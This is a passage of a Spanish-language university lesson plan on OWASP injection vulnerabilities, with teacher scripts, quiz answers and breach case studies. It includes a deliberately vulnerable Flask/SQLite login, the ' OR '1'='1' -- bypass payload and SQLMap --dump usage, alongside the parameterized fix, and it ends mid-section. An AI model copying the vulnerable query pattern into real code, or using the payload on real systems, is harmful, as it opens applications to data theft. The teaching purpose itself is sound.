# DOCUMENTO 1 — SESIÓN DE CLASE COMPLETA
## Curso: Programación Segura | Semana 5
### Tema: Metodología de Evaluación y Vulnerabilidades OWASP — Inyección SQL, NoSQL y de Comandos
**Universidad Autónoma del Perú | Ingeniería de Sistemas — Ciclo VIII**
**Duración total: 3 horas 20 minutos (200 minutos)**
**Fecha referencial: Semana 5 del ciclo 2026-1**

---

## LOGRO DE APRENDIZAJE

Al finalizar la sesión, el estudiante identifica, clasifica y propone controles para vulnerabilidades de inyección (SQL, NoSQL y de comandos) aplicando la metodología de evaluación de seguridad del OWASP Testing Guide v4.2, mediante el análisis de código fuente vulnerable y la construcción de matrices de riesgo.

---

## TABLA DE CONTENIDOS

1. [Cronograma de la sesión](#cronograma)
2. [Bloque 1 — INICIO + UTILIDAD (60 min)](#bloque-1)
   - [1a. Rompe-hielo — El detective de inyecciones (5 min)](#rompe-hielo)
   - [1b. Logro de aprendizaje (3 min)](#logro)
   - [1c. Revisión sesión anterior (7 min)](#revision)
   - [1d. Diagnóstico inicial (5 min)](#diagnostico)
   - [2. Utilidad (10 min)](#utilidad)
3. [RECESO (20 min)](#receso-medio)
4. [Bloque 2 — TRANSFORMACIÓN (70 min)](#bloque-2)
   - [T1. Metodología de Evaluación de Seguridad (10 min)](#t1)
   - [T2. Inyección SQL — Fundamentos (15 min)](#t2)
   - [T3. SQLi Avanzado — Blind y UNION (15 min)](#t3)
   - [T4. Inyección NoSQL (15 min)](#t4)
   - [T5. Inyección de Comandos (10 min)](#t5)
   - [T6. Matriz de Riesgos OWASP (5 min)](#t6)
5. [Bloque 3 — PRÁCTICA + CIERRE (50 min)](#bloque-3)
   - [4a. Caso práctico grupal (25 min)](#caso-practico)
   - [4b. Ejercicio individual (15 min)](#ejercicio-individual)
   - [5. Cierre (10 min)](#cierre)
6. [Guion verbal sugerido](#guion-verbal)
7. [Casos reales recomendados](#casos-reales)
8. [Evaluación formativa](#evaluacion-formativa)
9. [Referencias APA 7](#referencias)
10. [Recursos reales](#recursos)

---

## CRONOGRAMA DE LA SESIÓN {#cronograma}

| N° | Bloque | Actividad | Duración | Responsable |
|----|--------|-----------|----------|-------------|
| 1 | Bloque 1 | INICIO: Rompe-hielo "El detective de inyecciones" | 5 min | Docente |
| 2 | Bloque 1 | INICIO: Presentación del logro de aprendizaje | 3 min | Docente |
| 3 | Bloque 1 | INICIO: Revisión sesión anterior (S4 — OWASP Top 10, autenticación) | 7 min | Docente + Estudiantes |
| 4 | Bloque 1 | INICIO: Diagnóstico inicial sobre SQL y bases de datos | 5 min | Docente + Estudiantes |
| 5 | Bloque 1 | UTILIDAD: Relevancia profesional, estadísticas y casos reales | 10 min | Docente |
| — | RECESO | Pausa activa | 20 min | — |
| 6 | Bloque 2 | TRANSFORMACIÓN T1: Metodología de Evaluación de Seguridad | 10 min | Docente |
| 7 | Bloque 2 | TRANSFORMACIÓN T2: Inyección SQL — Fundamentos | 15 min | Docente |
| 8 | Bloque 2 | TRANSFORMACIÓN T3: SQLi avanzado — Blind y UNION | 15 min | Docente |
| 9 | Bloque 2 | TRANSFORMACIÓN T4: Inyección NoSQL (MongoDB) | 15 min | Docente |
| 10 | Bloque 2 | TRANSFORMACIÓN T5: Inyección de Comandos | 10 min | Docente |
| 11 | Bloque 2 | TRANSFORMACIÓN T6: Matriz de Riesgos OWASP | 5 min | Docente |
| 12 | Bloque 3 | PRÁCTICA: Caso práctico grupal — RetailApp | 25 min | Grupos + Docente |
| 13 | Bloque 3 | PRÁCTICA: Ejercicio individual — código PHP | 15 min | Estudiantes |
| 14 | Bloque 3 | CIERRE: Síntesis colaborativa + metacognición + tarea | 10 min | Docente + Estudiantes |
| **—** | **TOTAL** | | **200 min** | |

---

## BLOQUE 1 — INICIO + UTILIDAD (60 minutos) {#bloque-1}

---

### 1a. ROMPE-HIELO — "El Detective de Inyecciones" (5 minutos) {#rompe-hielo}

**Materiales necesarios:** Proyector con la siguiente imagen/texto en pantalla.

**Lo que se muestra en el proyector:**

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   Campo "Usuario" del sistema bancario XYZ:                 │
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │  ' OR '1'='1                                        │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
│   ¿Qué es esto? ¿Han visto algo así antes?                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Guion verbal exacto del docente:**

> "Buenos días a todos. Antes de empezar quiero mostrarles algo. [Señala la pantalla] Miren esto. Imaginen que están en la página de login de su banco — ese banco donde tienen sus ahorros, sus tarjetas. En el campo de 'usuario' alguien escribió exactamente esto: comilla simple, OR, comilla simple, uno, igual, uno, comilla simple. [Pausa de 3 segundos] Mi pregunta es muy simple: ¿alguien sabe qué es esto? ¿Han visto algo parecido alguna vez? No tiene que ser en seguridad — puede ser en cualquier contexto. [Espera respuestas espontáneas durante 2 minutos] Bien. Lo que están viendo es una de las técnicas de ataque más antiguas y más devastadoras de la historia de la ciberseguridad. Tiene 30 años de existencia y todavía hoy, en 2026, empresas con millones de usuarios siguen siendo vulnerables a exactamente esto. Hoy van a entender exactamente qué significa, cómo funciona, y sobre todo cómo prevenirlo. Se convierten en detectives de inyecciones."

**Nota para el docente:** No confirme ni niegue las respuestas todavía. El objetivo es activar curiosidad y conocimientos previos. Si un estudiante ya sabe que es SQL injection, dígale: "Exacto, ¿y puedes explicarle a tus compañeros por qué eso es peligroso?" — esto genera discusión sin revelar todo el contenido.

---

### 1b. LOGRO DE APRENDIZAJE (3 minutos) {#logro}

**Lo que se muestra en el proyector:**

```
LOGRO DE APRENDIZAJE — SEMANA 5

Al finalizar esta sesión, el estudiante:

✓ IDENTIFICA vulnerabilidades de inyección (SQL, NoSQL y 
  de comandos) en fragmentos de código fuente

✓ CLASIFICA cada vulnerabilidad según el marco OWASP 
  Top 10 A03:2021

✓ CONSTRUYE matrices de riesgo con probabilidad × impacto

✓ PROPONE controles concretos (código corregido) para 
  cada vulnerabilidad encontrada

APLICANDO: Metodología OWASP Testing Guide v4.2
```

**Guion verbal exacto del docente:**

> "Muy bien. Antes de continuar, quiero que todos sepan exactamente qué se espera de ustedes al terminar esta sesión. No es memorizar definiciones — es hacer. [Lee el logro en voz alta, señalando cada ítem] Primero: IDENTIFICAR — esto significa que si yo les doy un código, ustedes deben saber dónde está el problema, no solo intuirlo. Segundo: CLASIFICAR — no todas las inyecciones son iguales, hay diferentes tipos con diferentes niveles de riesgo, y hoy aprenden a distinguirlos. Tercero: CONSTRUIR una matriz de riesgo — herramienta que usarán en su vida profesional para reportar hallazgos a sus jefes o clientes. Cuarto: PROPONER el fix — porque encontrar el problema sin saber cómo resolverlo no sirve de nada en el mundo laboral. Todo esto usando la metodología oficial de OWASP, que es el estándar que usan los pentesters y auditores de seguridad en todo el mundo. ¿Alguna pregunta sobre lo que vamos a lograr hoy? [Pausa] Perfecto. Empecemos."

---

### 1c. REVISIÓN SESIÓN ANTERIOR (7 minutos) {#revision}

**Contexto:** La semana 4 cubrió OWASP Top 10 general, autenticación rota (A07:2021) y fallos de autorización (A01:2021).

**Instrucción para el docente:** Hacer las preguntas en orden. Para cada pregunta, dar 30-40 segundos de pensar antes de pedir respuesta. Seleccionar voluntarios o preguntar por nombre. Si nadie responde, dar una pista, no la respuesta.

---

**PREGUNTA 1:**

> "La semana pasada vimos el OWASP Top 10. ¿Cuál es la diferencia entre A01:2021 — Broken Access Control y A07:2021 — Identification and Authentication Failures? ¿No son lo mismo?"

**Respuesta esperada COMPLETA (lo que debe decir o incluir el estudiante):**

Son categorías distintas aunque relacionadas. Broken Access Control (A01:2021) se refiere a que el sistema no aplica correctamente las restricciones sobre lo que los usuarios autenticados pueden hacer — por ejemplo, un usuario normal que puede acceder a la URL `/admin/panel` simplemente cambiando la dirección, o que puede ver los datos de otro usuario modificando un ID en la URL (`/perfil?id=123` cambia a `/perfil?id=124`). El problema está en las reglas de autorización que controlan qué recursos puede acceder cada rol. En cambio, Identification and Authentication Failures (A07:2021) se refiere a fallos en el proceso de verificar quién es el usuario — contraseñas débiles permitidas por el sistema, sesiones que no expiran, falta de autenticación multifactor, almacenamiento de contraseñas en texto plano o con hashes débiles como MD5. En resumen: A01 es "quién puede hacer qué después de entrar" y A07 es "cómo se verifica que eres quien dices ser para entrar".

**Si el estudiante responde mal (confunde ambos conceptos):**

> "Estás mezclando los conceptos. Te doy un ejemplo concreto: si el banco te deja entrar solo con tu DNI sin contraseña, eso es fallo de autenticación (A07). Si entras con tu contraseña correcta pero desde tu perfil puedes ver el saldo de otro cliente cambiando el número de cuenta en la URL, eso es control de acceso roto (A01). ¿Lo ves ahora? La autenticación pregunta '¿eres tú?', el control de acceso pregunta '¿puedes hacer esto?'"

---

**PREGUNTA 2:**

> "¿Qué es el OWASP Top 10 y por qué no es una lista de 'los 10 bugs más comunes'? ¿Qué representa realmente?"

**Respuesta esperada COMPLETA:**

El OWASP Top 10 no es simplemente una lista de los bugs más frecuentes, sino una clasificación de las 10 categorías de riesgo de seguridad más críticas para aplicaciones web, basada en datos recolectados de cientos de organizaciones y miles de aplicaciones a nivel mundial. Cada categoría agrupa múltiples tipos de vulnerabilidades relacionadas. Por ejemplo, A03:2021 — Injection agrupa no solo SQL injection sino también NoSQL injection, command injection, LDAP injection, entre otras. El Top 10 se actualiza periódicamente — la versión actual es 2021 — y combina criterios de incidencia (qué tan común es), detectabilidad (qué tan fácil es detectarla), explotabilidad (qué tan fácil es atacarla) e impacto (qué tanto daño causa si se explota). Su propósito es dar a las organizaciones una guía priorizada: si quieres proteger tu aplicación, empieza por estas 10 áreas. No es exhaustivo — hay vulnerabilidades fuera del Top 10 — pero cubre los problemas que generan el mayor riesgo real en la industria.

**Si el estudiante responde mal:**

> "No exactamente. El Top 10 no es 'los 10 errores que más cometen los programadores'. Es una lista de categorías de riesgo priorizadas por datos reales de miles de aplicaciones. La diferencia es importante: una categoría puede incluir docenas de vulnerabilidades distintas. ¿Puedes decirme qué significa que A03:2021 agrupe SQL injection, NoSQL injection y command injection en una sola categoría?"

---

**PREGUNTA 3:**

> "Si un sistema guarda las contraseñas de sus usuarios con hash MD5, ¿cuál es el problema de seguridad concreto y qué debería usar en su lugar?"

**Respuesta esperada COMPLETA:**

El problema con MD5 como función de hash para contraseñas es múltiple. Primero, MD5 es un algoritmo diseñado para velocidad, no para seguridad de contraseñas — puede calcular miles de millones de hashes por segundo con hardware moderno (GPU), lo que hace triviales los ataques de fuerza bruta y diccionario. Segundo, MD5 no tiene salt incorporado en su diseño estándar, lo que permite ataques de rainbow tables — tablas precomputadas que relacionan hashes con sus contraseñas originales. Tercero, MD5 tiene colisiones conocidas (dos inputs distintos que producen el mismo hash), aunque esto es menos relevante para contraseñas. Las soluciones correctas son algoritmos específicamente diseñados para hashing de contraseñas, que son intencionalmente lentos y usan salt automático: bcrypt (factor de coste configurable), scrypt (resistente a hardware especializado) y Argon2 (ganador del Password Hashing Competition de 2015, recomendado actualmente por OWASP). Estos algoritmos son "lentos por diseño" — hacen que un ataque de fuerza bruta tarde años en lugar de segundos. En Python, la librería `bcrypt` o `passlib` implementan esto correctamente.

**Si el estudiante responde mal:**

> "Recuerda que no es solo 'MD5 es viejo'. El problema es que MD5 fue diseñado para ser RÁPIDO — perfecto para verificar integridad de archivos, pero terrible para contraseñas porque un atacante puede probar miles de millones de combinaciones por segundo. ¿Qué algoritmos específicos para contraseñas vimos la semana pasada?"

---

### 1d. DIAGNÓSTICO INICIAL (5 minutos) {#diagnostico}

**Instrucción para el docente:** Estas preguntas evalúan conocimientos previos de SQL y bases de datos necesarios para comprender SQLi. No se califican. El objetivo es saber el nivel del grupo para ajustar el ritmo de la Transformación.

---

**PREGUNTA DIAGNÓSTICA 1:**

> "Sin pensar en seguridad — ¿qué hace esta consulta SQL? `SELECT * FROM usuarios WHERE usuario='admin' AND password='1234'`"

**Respuesta esperada COMPLETA:**

Esta consulta SQL busca en la tabla `usuarios` todos los campos (el asterisco `*` significa "todas las columnas") de aquellas filas donde simultáneamente se cumplan dos condiciones: que el valor de la columna `usuario` sea exactamente la cadena `admin` Y que el valor de la columna `password` sea exactamente la cadena `1234`. El operador `AND` significa que ambas condiciones deben ser verdaderas al mismo tiempo. Si existe una fila que cumpla ambas condiciones, la consulta devuelve esa fila con todos sus datos. Si no existe ninguna fila que cumpla ambas condiciones, la consulta devuelve un resultado vacío (cero filas). En el contexto de un sistema de login, si devuelve una fila, el usuario es autenticado; si devuelve vacío, el acceso es denegado.

---

**PREGUNTA DIAGNÓSTICA 2:**

> "¿Qué diferencia hay entre una base de datos relacional (como MySQL o PostgreSQL) y una base de datos NoSQL (como MongoDB)? ¿En qué tipo de proyectos usarías cada una?"

**Respuesta esperada COMPLETA:**

Las bases de datos relacionales (SQL) organizan los datos en tablas con filas y columnas, con un esquema rígido predefinido — cada fila debe tener exactamente las mismas columnas con los mismos tipos de datos. Usan SQL (Structured Query Language) para consultas y soportan relaciones entre tablas mediante claves foráneas y JOINs. Son ideales para datos con estructura estable y donde la integridad transaccional es crítica: sistemas bancarios, ERP, sistemas de facturación. Las bases de datos NoSQL no usan tablas — pueden almacenar documentos JSON (MongoDB), pares clave-valor (Redis), grafos (Neo4j) o columnas anchas (Cassandra). Son más flexibles en esquema — cada documento puede tener campos distintos — y escalan horizontalmente con mayor facilidad. Son ideales para datos semiestructurados, alta velocidad de escritura, o datos cuya estructura cambia frecuentemente: redes sociales, catálogos de e-commerce, logs, aplicaciones en tiempo real. La diferencia clave no es que una sea "mejor" que la otra, sino que cada una es adecuada para diferentes patrones de datos y acceso.

---

**PREGUNTA DIAGNÓSTICA 3:**

> "En programación, ¿qué es una 'consulta parametrizada' o 'prepared statement'? ¿Alguien lo ha usado?"

**Respuesta esperada COMPLETA:**

Una consulta parametrizada (también llamada prepared statement o sentencia preparada) es una forma de ejecutar consultas en una base de datos donde los valores variables se pasan por separado de la estructura de la consulta, en lugar de construir la consulta completa como un texto concatenado. En lugar de escribir `"SELECT * FROM usuarios WHERE usuario='" + usuario + "'"`, se escribe `"SELECT * FROM usuarios WHERE usuario=?"` y luego se pasa el valor del usuario como parámetro separado. El motor de base de datos primero "prepara" la estructura de la consulta (la compila y valida), y luego aplica los parámetros como datos puros, no como parte del código SQL. Esto significa que incluso si el usuario escribe código SQL malicioso en el campo de entrada, ese código se trata como un dato de texto simple y nunca se ejecuta como instrucción SQL. Es la defensa principal contra SQL injection. En Python con sqlite3 se usa el marcador `?`, en Python con psycopg2 (PostgreSQL) se usa `%s`, y en la mayoría de ORMs como SQLAlchemy esto se maneja automáticamente.

**Nota para el docente:** Si la mayoría del grupo no sabe qué es un prepared statement, dedicar 2 minutos adicionales en T2 para explicarlo antes de mostrar el código seguro.

---

## 2. UTILIDAD (10 minutos) {#utilidad}

**Instrucción para el docente:** Esta sección responde a la pregunta implícita del estudiante: "¿Por qué tengo que aprender esto?" Debe ser presentada con energía y datos concretos. Usar el proyector para mostrar las estadísticas mientras se habla.

---

### ¿Por qué importa en tu vida profesional?

**Guion verbal del docente:**

> "Antes de entrar al contenido técnico, quiero que entiendan por qué lo que van a aprender hoy no es teoría de libros — es habilidad de mercado laboral. Hay tres razones concretas."

**Razón 1 — Frecuencia:**

> "Según el reporte oficial de OWASP de 2021, la categoría A03:2021 — Injection fue la tercera vulnerabilidad más crítica del mundo, y estuvo presente en el 94% de las aplicaciones probadas. No en el 10%, no en el 30% — el 94%. Eso significa que si hoy fueran a hacer una auditoría de seguridad de casi cualquier aplicación web del mercado, encontrarían alguna forma de inyección. Esto es el problema más común después del control de acceso roto."

**Razón 2 — Impacto económico real:**

> "Les voy a mencionar tres casos reales con sus pérdidas documentadas."

**Caso 1 — Heartland Payment Systems (2008):**
En enero de 2008, la empresa procesadora de pagos Heartland Payment Systems sufrió lo que en su momento fue la mayor brecha de datos de tarjetas de crédito de la historia de EE.UU. Un atacante, Albert Gonzalez, explotó una vulnerabilidad de SQL injection en el sistema web de Heartland para instalar malware que capturó datos de más de 130 millones de tarjetas de crédito y débito. Las pérdidas para la empresa superaron los $130 millones de dólares en multas, litigios, compensaciones y costos de remediación, además de la destrucción de su reputación. La vulnerabilidad explotada era exactamente lo que vamos a estudiar hoy.

**Caso 2 — LinkedIn (2012):**
En 2012, LinkedIn sufrió una brecha donde 6.5 millones de hashes de contraseñas fueron robados y publicados en un foro ruso. En 2016 se descubrió que en realidad habían sido 117 millones de cuentas. El vector inicial fue una inyección SQL que permitió al atacante extraer la base de datos de usuarios. Agravó el daño el hecho de que LinkedIn usaba SHA-1 sin salt para hashear contraseñas, permitiendo que la mayoría fueran crackeadas en días.

**Caso 3 — RockYou (2009):**
RockYou era una empresa de aplicaciones para redes sociales. En 2009, un atacante explotó una SQL injection en su sitio web y extrajo 32 millones de contraseñas de usuarios — almacenadas en texto plano, sin ningún tipo de hash. Esta base de datos, conocida como "rockyou.txt", es hoy el diccionario de contraseñas más usado en ataques de fuerza bruta y está disponible por defecto en Kali Linux. El ataque que comprometió 32 millones de cuentas tomó horas. La causa raíz: SQL injection + mal almacenamiento de contraseñas.

---

**Razón 3 — Demanda laboral:**

> "Si buscan en LinkedIn empleos de 'seguridad de aplicaciones', 'pentesting', 'AppSec' o 'DevSecOps' en Perú y Latinoamérica, el 80% de las ofertas mencionan explícitamente OWASP Top 10 como conocimiento requerido. Lo que aprenden hoy es lo que les van a preguntar en entrevistas técnicas."

---

### La pregunta retadora

**Guion verbal del docente:**

> "Ahora les hago una pregunta. [Pausa dramática] Si yo les digo que con UN solo símbolo — un apóstrofe, la comilla simple, este signo: ' — pueden potencialmente robar toda la base de datos de una empresa, ¿me creen?"

**Esperar respuestas del aula. Opciones esperadas:**
- "Sí" (estudiantes que ya conocen SQLi)
- "No, imposible" (estudiantes escépticos)
- "Depende" (estudiantes más cuidadosos)

**Respuesta esperada DETALLADA que el docente debe dar:**

> "La respuesta correcta es: SÍ, si la aplicación es vulnerable. Y les voy a explicar exactamente por qué. Cuando un sistema concatena el input del usuario directamente dentro de una consulta SQL, ese apóstrofe no es tratado como un carácter de texto — es tratado como parte de la sintaxis SQL. El apóstrofe en SQL sirve para delimitar cadenas de texto. Si el desarrollador construyó la consulta como: `SELECT * FROM usuarios WHERE usuario='[lo que escriba el usuario]'`, y el usuario escribe una comilla simple, la consulta se convierte en: `SELECT * FROM usuarios WHERE usuario='''` — lo que genera un error de sintaxis SQL. Ese error le dice al atacante que el sistema es vulnerable. A partir de ahí, con los payloads correctos, puede extraer toda la estructura de la base de datos, todos sus datos, y en algunos casos ejecutar comandos en el servidor. Todo eso empieza con un apóstrofe. Eso es exactamente lo que van a entender en detalle en los próximos 70 minutos."

---

## ─── RECESO (20 minutos) ─── {#receso-medio}

**Instrucción para el docente:** Anunciar el receso con exactitud para mantener el ritmo. Sugerir a los estudiantes revisar mentalmente las preguntas del diagnóstico. Iniciar el Bloque 2 puntualmente.

---

## BLOQUE 2 — TRANSFORMACIÓN (70 minutos) {#bloque-2}

---

### T1. Metodología de Evaluación de Seguridad (10 minutos) {#t1}

**Instrucción para el docente:** Proyectar cada sección mientras se explica verbalmente. Ritmo rápido — este es el marco teórico que sustenta todo lo demás.

---

#### OWASP Testing Guide v4.2 — Las 5 Fases

La metodología oficial para evaluar la seguridad de aplicaciones web es el **OWASP Testing Guide (OTG) v4.2**, publicado en 2020. Define un proceso estructurado de cinco fases:

**Fase 1 — Reconnaissance (Reconocimiento)**
Recolección de información pasiva y activa sobre el objetivo. Se identifica la superficie de ataque: dominios, subdominios, tecnologías usadas (lenguaje, frameworks, servidor web, base de datos), versiones de software, puertos abiertos, empleados clave mediante OSINT (Open Source Intelligence). Herramientas: Shodan, theHarvester, Maltego, Google Dorks, WHOIS. En esta fase el atacante/auditor NO interactúa directamente con la aplicación objetivo — usa fuentes públicas.

**Fase 2 — Mapping (Mapeo de la Aplicación)**
Exploración directa de la aplicación para documentar su estructura completa: endpoints, funcionalidades, flujos de autenticación, parámetros de entrada, cookies, formularios, APIs. Se crea un mapa de la aplicación. Herramientas: Burp Suite (spider/crawler), OWASP ZAP, navegador con DevTools. En esta fase se identifica DÓNDE podrían existir puntos de entrada para inyecciones.

**Fase 3 — Discovery (Descubrimiento de Vulnerabilidades)**
Pruebas activas para identificar vulnerabilidades en los puntos de entrada mapeados. Se aplican pruebas específicas del OWASP Testing Guide — para SQLi se usa OTG-INPVAL-005, para command injection OTG-INPVAL-013, etc. Herramientas: SQLMap, Nikto, OWASP ZAP (active scan). Es aquí donde se confirma si `' OR '1'='1` produce un comportamiento anómalo.

**Fase 4 — Exploitation (Explotación)**
Solo en pruebas de penetración (no en vulnerability assessments). Se explota la vulnerabilidad confirmada para demostrar el impacto real: extracción de datos, escalada de privilegios, ejecución de comandos. El objetivo es cuantificar el daño real que causaría un atacante. Herramientas: SQLMap en modo completo, Metasploit, scripts personalizados.

**Fase 5 — Reporting (Reporte)**
Documentación estructurada de todos los hallazgos: descripción técnica de cada vulnerabilidad, evidencia (capturas, payloads), clasificación de riesgo (CVSS Score), impacto potencial y recomendaciones de remediación priorizadas. El reporte tiene dos versiones: técnica (para el equipo de desarrollo) y ejecutiva (para gerencia).

---

#### Vulnerability Assessment vs Penetration Testing

| Característica | Vulnerability Assessment | Penetration Testing |
|---|---|---|
| **Objetivo** | Identificar y catalogar vulnerabilidades | Demostrar impacto real de la explotación |
| **Profundidad** | Amplio pero superficial | Profundo y dirigido |
| **Explotación** | NO se explota (solo se detecta) | SÍ se explota (con permiso documentado) |
| **Herramientas típicas** | Escáneres automáticos (Nessus, OpenVAS) | Herramientas manuales + automáticas (Metasploit, SQLMap, Burp Suite) |
| **Duración** | Horas a días | Días a semanas |
| **Resultado** | Lista priorizada de vulnerabilidades | Informe de impacto real + ruta de ataque completa |
| **Quién lo hace** | Analistas de seguridad, DevSecOps | Pentesters certificados (OSCP, CEH) |
| **Cuándo usarlo** | Auditorías periódicas, cumplimiento | Pre-lanzamiento, post-incidente, compliance PCI-DSS |

---

**Pregunta al grupo:**

> "¿En qué fase de la metodología OWASP Testing Guide encajaría el uso de SQLMap para detectar si un parámetro de login es vulnerable a inyección SQL?"

**Respuesta esperada DETALLADA:**

SQLMap usado para detectar (no explotar) una vulnerabilidad encaja principalmente en la Fase 3 — Discovery. En esta fase, el auditor ya ha mapeado (Fase 2) que existe un parámetro de login con campos de usuario y contraseña que acepta input del usuario, y ahora ejecuta SQLMap con opciones básicas de detección (`--level` y `--risk` bajos) para confirmar si ese parámetro responde de manera anómala a payloads de inyección. Si SQLMap confirma que el parámetro es vulnerable, el auditor tiene evidencia para incluir en el reporte. Si el encargo es un penetration test (no solo un assessment), entonces pasaría a Fase 4 y usaría SQLMap con `--dump` para extraer datos reales como demostración de impacto.

---

**Mini actividad (integrada en los 10 minutos):**

> "En su hoja de apuntes, escriban en qué fase de la metodología se realizaría cada una de estas acciones. Tienen 60 segundos."

| Acción | ¿En qué fase? |
|--------|---------------|
| Buscar en Google: `site:empresa.com filetype:sql` | Fase 1 — Reconnaissance |
| Navegar la aplicación con Burp Suite para listar todos los formularios | Fase 2 — Mapping |
| Ejecutar SQLMap para detectar si `/login?user=` es vulnerable | Fase 3 — Discovery |
| Usar SQLMap con `--dump` para extraer la tabla de usuarios | Fase 4 — Exploitation |
| Escribir el hallazgo con CVSS Score y recomendación de fix | Fase 5 — Reporting |

---

### T2. Inyección SQL — Fundamentos (15 minutos) {#t2}

#### Definición técnica rigurosa

La **Inyección SQL (SQL Injection, SQLi)** es una vulnerabilidad de seguridad de aplicaciones web que ocurre cuando datos controlados por el usuario son incorporados dentro de una consulta SQL de forma insegura — típicamente mediante concatenación de cadenas — sin validación, sanitización ni uso de consultas parametrizadas. Esto permite a un atacante modificar la lógica de la consulta SQL original, haciendo que el motor de base de datos ejecute instrucciones arbitrarias que el desarrollador nunca intentó permitir. Pertenece a la categoría OWASP A03:2021 — Injection y puede resultar en extracción no autorizada de datos, modificación o eliminación de datos, bypass de autenticación, y en casos extremos, ejecución de comandos en el sistema operativo a través del motor de base de datos.

---

#### Tipos de SQL Injection

**1. Classic SQLi (In-band)**
El resultado de la consulta manipulada se devuelve directamente en la respuesta HTTP de la aplicación. Es el tipo más directo y fácil de explotar.

**2. Error-based SQLi**
Subtipo de in-band. El atacante provoca errores de sintaxis SQL deliberados para extraer información de los mensajes de error que devuelve la aplicación. Requiere que la aplicación muestre mensajes de error detallados al usuario.

**3. UNION-based SQLi**
Subtipo de in-band. El atacante usa el operador SQL `UNION` para añadir una consulta adicional a la original, cuyo resultado se devuelve junto con el resultado legítimo. Requiere conocer el número y tipo de columnas de la consulta original.

**4. Blind SQLi — Boolean-based**
La aplicación no devuelve los datos de la consulta en la respuesta, pero se comporta diferente según si la condición inyectada es verdadera o falsa (por ejemplo, muestra contenido vs. página vacía). El atacante infiere datos comparando respuestas.

**5. Blind SQLi — Time-based**
La aplicación no revela diferencia en su respuesta según la condición, pero el atacante puede inyectar funciones de espera (`SLEEP()`, `WAITFOR DELAY`). Si la respuesta tarda más de lo normal, la condición inyectada es verdadera.

---

#### Código VULNERABLE — Python Flask + SQLite

```python
# ❌ CÓDIGO VULNERABLE — Nunca hacer esto en producción
# Archivo: app_vulnerable.py

import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/login')
def login():
    # Se obtiene el input del usuario directamente de la URL
    # Ejemplo de URL legítima: /login?usuario=admin&password=secreto123
    usuario = request.args.get('usuario')   # Input del usuario sin validar
    password = request.args.get('password')  # Input del usuario sin validar
    
    conn = sqlite3.connect('usuarios.db')
    cursor = conn.cursor()
    
    # *** AQUÍ ESTÁ LA VULNERABILIDAD ***
    # Se construye la consulta SQL concatenando directamente los strings del usuario
    # El f-string de Python inserta las variables dentro del texto de la consulta
    consulta = f"SELECT * FROM usuarios WHERE usuario='{usuario}' AND password='{password}'"
    
    # Si usuario = admin y password = secreto123, la consulta es:
    # SELECT * FROM usuarios WHERE usuario='admin' AND password='secreto123'
    # → Comportamiento esperado: busca admin con esa contraseña
    
    # PERO si el atacante ingresa:
    # usuario = ' OR '1'='1' --
    # password = cualquier_cosa
    # La consulta se convierte en:
    # SELECT * FROM usuarios WHERE usuario='' OR '1'='1' --' AND password='cualquier_cosa'
    # El '--' comenta todo lo que sigue, eliminando la verificación de contraseña
    # '1'='1' siempre es verdadero → la consulta devuelve TODOS los usuarios
    # El sistema autentica al atacante como el PRIMER usuario de la base de datos (generalmente admin)
    
    resultado = cursor.execute(consulta).fetchone()
    conn.close()
    
    if resultado:
        return f"Bienvenido {resultado[0]}"  # Muestra el nombre del usuario
    return "Acceso denegado"

if __name__ == '__main__':
    app.run(debug=True)
```

---

#### Anatomía del ataque — paso a paso

**Input del atacante en el campo "usuario":** `' OR '1'='1' --`

**Paso 1 — Consulta original (como la diseñó el desarrollador):**
```sql
SELECT * FROM usuarios WHERE usuario='[INPUT]' AND password='[PASSWORD]'
```

**Paso 2 — Consulta con input legítimo `admin`:**
```sql
SELECT * FROM usuarios WHERE usuario='admin' AND password='secreto123'
```
Resultado: busca exactamente al usuario "admin" con esa contraseña.

**Paso 3 — Consulta con payload malicioso:**
```sql
SELECT * FROM usuarios WHERE usuario='' OR '1'='1' --' AND password='...'
```

**Paso 4 — Análisis de la consulta modificada:**
- `usuario=''` → Condición falsa (no existe usuario vacío)
- `OR '1'='1'` → Condición SIEMPRE VERDADERA
- `--` → Inicio de comentario SQL — todo lo que sigue es ignorado por el motor
- La parte `AND password='...'` queda comentada y nunca se evalúa

**Paso 5 — Resultado:**
- La cláusula WHERE se reduce a: `WHERE '' OR TRUE`
- Esto es equivalente a `WHERE TRUE`
- La consulta devuelve TODAS las filas de la tabla `usuarios`
- El código Python toma el primer resultado con `.fetchone()` y autentica al atacante como ese usuario (generalmente el administrador si fue el primero en registrarse)

---

#### Código SEGURO — Consulta Parametrizada

```python
# ✅ CÓDIGO SEGURO — Usando consultas parametrizadas
# Archivo: app_segura.py

import sqlite3
from flask import Flask, request

app = Flask(__name__)

@app.route('/login')
def login():
    usuario = request.args.get('usuario')
    password = request.args.get('password')
    
    conn = sqlite3.connect('usuarios.db')
    cursor = conn.cursor()
    
    # *** SOLUCIÓN: Consulta parametrizada ***
    # El '?' es un marcador de posición (placeholder)
    # Los valores se pasan como una TUPLA separada de la consulta
    consulta = "SELECT * FROM usuarios WHERE usuario=? AND password=?"
    
    # El motor de SQLite maneja la sustitución de forma segura:
    # 1. Primero "compila" la estructura de la consulta (el esqueleto con '?')
    # 2. Luego aplica los valores como DATOS PUROS, no como código SQL
    # Si el atacante ingresa ' OR '1'='1' --, ese texto se busca LITERALMENTE
    # como nombre de usuario, no se interpreta como código SQL
    resultado = cursor.execute(consulta, (usuario, password)).fetchone()
    conn.close()
    
    if resultado:
        return f"Bienvenido {resultado[0]}"
    return "Acceso denegado"

# VALIDACIÓN ADICIONAL RECOMENDADA (defensa en profundidad):
def validar_usuario(usuario: str) -> bool:
    """Solo permite alfanuméricos y guiones bajos en nombres de usuario"""
    import re
    return bool(re.match(r'^[a-zA-Z0-9_]{3,50}$', usuario))

if __name__ == '__main__':
    app.run(debug=False)  # NUNCA debug=True en producción
```

---

**Error común — desmitificar:**

